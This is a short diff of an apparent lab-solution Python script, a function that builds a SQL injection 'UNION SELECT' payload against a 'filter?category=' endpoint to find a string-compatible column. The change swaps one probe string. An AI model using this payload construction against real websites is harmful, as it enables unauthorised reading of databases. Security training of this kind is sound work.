@@ -50,7 +50,7 @@ def exploit_sqli_column_number(url, proxies=None):
 def exploit_sqli_string_field(url, num_col, proxies=None):
     path = "filter?category=Pets"
     for i in range(1, num_col+1):
-        string = "'Jx7YJ6'"
+        string = "'LIflf7'"
         payload_list = [' NULL'] * num_col
         payload_list[i-1] = string
         sqli_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
